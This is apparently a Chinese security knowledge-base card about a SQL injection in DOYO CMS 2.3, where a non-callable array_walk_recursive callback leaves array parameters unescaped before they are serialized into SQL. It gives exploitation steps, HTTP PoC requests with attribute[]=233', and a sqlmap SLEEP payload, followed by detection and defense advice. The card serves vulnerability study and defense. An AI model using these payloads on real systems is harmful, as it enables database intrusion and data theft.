---
id: web-generic-sqli-php-array-filter-walk-recursive-unfiltered
title: PHP 数组参数过滤器回调写错导致 addslashes 失效：serialize 后拼接 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: array-param-filter-callback-bypass
tags:
- php
- sqli
- array-parameter
- array-walk-recursive
- filter-bypass
- cms
- serialized
cve: []
severity: high
confidence: high
status: verified
affected_versions: DOYO CMS 2.3（原文 config version=2.3、update=20130118）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:02:56+08:00'
  notes: 已对照原文与图13-17核对：syArgs::filters 的数组分支用 array_walk_recursive($value,'$this->arrays')，字符串回调非合法 callable，数组元素未经 trim/htmlspecialchars/addslashes；图13 adminuser[]=233' 回显 233'233&#039;（数组未转义、标量被转义）；图16 cartadd 的 attribute[]=233' 触发 SQL 语法错误并回显完整 SQL（serialize 后拼接）；图17 sqlmap 确认 attribute[] error-based(GTID_SUBSET)/time-based(SLEEP)，DBMS MySQL>=5.6；图15 显示多处 syArgs(name,2)。版本 DOYO CMS 2.3 来自原文 config version=2.3/update=20130118 与仓库 base 2.3，保留。PoC 未在本机复现。
url: /docs/web/generic/sqli/web-generic-sqli-php-array-filter-walk-recursive-unfiltered/
draft: false
kb_aliases:
- syArgs 数组注入
- array_walk_recursive 过滤失效
- DOYO CMS SQL 注入
- attribute[] 注入
- 数组参数绕过 addslashes
---

## 一句话结论

PHP 应用把数组参数交给 `array_walk_recursive($value, '$this->arrays')` 做过滤，但回调字符串写错/不可调用，数组元素实际没有被 `addslashes` 或 `htmlspecialchars` 处理；这些元素随后被 `serialize()` 并拼进 SQL，攻击者用 `attribute[]=233'` 即可在数组参数位置注入，绕过只对字符串参数生效的过滤。

## 原理

- 常见参数封装类按类型过滤：整数 `(int)`、字符串 `htmlspecialchars + addslashes`、数组 `array_walk_recursive`。数组分支本意是对每个元素调用过滤方法。
- 缺陷代码：`array_walk_recursive($value, '$this->arrays');`。第二个参数应是合法 callable（如 `array($this, 'arrays')`），字符串 `'$this->arrays'` 不是可调用函数名，`array_walk_recursive` 不会执行预期过滤；数组元素原样保留。
- 标量分支会在 `get_magic_quotes_gpc()` 为假时 `addslashes`，但数组分支因为回调失效，数组里的单引号没有被转义。
- 业务把数组 `serialize($attribute)` 后作为字符串拼进 `find`/`create` 的 WHERE/INSERT 条件，例如：
  `SELECT * FROM goodscart WHERE aid='111' AND uid='16' AND attribute='a:1:{i:0;s:4:"233"';}' ORDER BY id LIMIT 1`
  单引号闭合 SQL 字符串，形成注入。
- 错误页面直接回显 SQL 与数据库报错，进一步确认 error-based 注入；也可用时间盲注绕过无回显场景。
- 根因是“输入过滤依赖一个未生效的回调”+“拼接 SQL”，两者叠加；不是 addslashes 本身能解决的编码/宽字节问题。

## 触发条件

- 应用存在按类型过滤的参数封装，数组分支使用 `array_walk_recursive` 且回调写法错误/不可调用。
- 某个业务把数组参数 `serialize` 后拼接进 SQL，而不是参数化查询。
- 攻击者能访问该业务接口；通常需要普通用户登录（如购物车接口）。
- 数据库错误可回显或存在可观测的时间差。

## 利用步骤

1. 注册/登录普通用户，找到接收数组参数的接口（如购物车 `cartadd` 的 `attribute[]`）。
2. 先发正常数组值确认业务路径与参数名。
3. 在数组元素中放单引号：`attribute[]=233'`，观察是否出现 SQL 语法错误或行为变化。
4. 用 error-based（`GTID_SUBSET`、`EXTRACTVALUE` 等）或 time-based（`SLEEP`）载荷确认注入并提取数据。
5. 或直接用 sqlmap 指定 `attribute[]` 为注入点，确认 DBMS 与可读数据。
6. 评估是否能读取管理员哈希、配置、业务数据；授权测试中只取最小证明。

## PoC

正常请求：

```http
POST /index.php?c=pay&a=cartadd HTTP/1.1
Host: target
Cookie: PHPSESSID=<user-session>
Content-Type: application/x-www-form-urlencoded

attribute[]=233&id=111&quantity=1
```

注入请求：

```http
POST /index.php?c=pay&a=cartadd HTTP/1.1
Host: target
Cookie: PHPSESSID=<user-session>
Content-Type: application/x-www-form-urlencoded

attribute[]=233'&id=111&quantity=1
```

服务端拼接后的 SQL（原文报错）：

```sql
SELECT * FROM dy_goodscart WHERE aid = '111' AND uid = '16'
AND attribute = 'a:1:{i:0;s:4:"233"';}' ORDER BY id LIMIT 1
```

sqlmap 时间盲注载荷示例：

```text
attribute[]=233' AND (SELECT 1390 FROM (SELECT(SLEEP(5)))kUgV)-- Kijj&id=111
```

## 变体与关联

- 参数变体：任何 `syArgs(name, 2)` 的数组参数（如 `ids[]`、`orders[]`、`paction[]`、`keyv[]`）都可能进入不同 SQL sink；原文全局搜索到多处。
- 过滤变体：`array_walk_recursive` 回调为字符串、回调方法不存在、回调只 trim 不转义、只对第一层过滤；都可能留下未过滤元素。
- 注入位置：`serialize` 后的值进入 `WHERE`、`INSERT`、`UPDATE`；也可进入 `ORDER BY`/`LIMIT` 等无法参数化的位置。
- 关联卡片：[[web-generic-sqli-blind-filter-bypass-functions]]、[[web-generic-sqli-error-based-extraction]]、[[web-generic-sqli-time-blind]]。
- 关联：PHP 参数封装/过滤类审计、`addslashes` 与字符集/宽字节问题。

## 检测与防御

- 检测：请求中出现数组参数（`name[]=`）且元素含单引号、注释符、`SLEEP`、`GTID_SUBSET` 等；响应回显 SQL 语法错误或数据库报错。
- 检测：代码审计发现 `array_walk_recursive` 的第二个参数是字符串 `'$this->method'` 而不是 `array($this,'method')`。
- 防御：修正回调为合法 callable，或对数组元素逐个显式过滤；数组过滤后仍要做类型/白名单校验。
- 防御：SQL 使用预处理/参数化查询；`serialize` 值不能作为 SQL 字符串拼接；排序列等动态部分使用白名单映射。
- 加固：关闭生产环境 SQL 报错回显；WAF 只能辅助，不能替代参数化；对数组参数做深度/元素数限制。
- 响应：排查注入日志、评估数据泄露范围、修复后回归所有数组参数 sink。
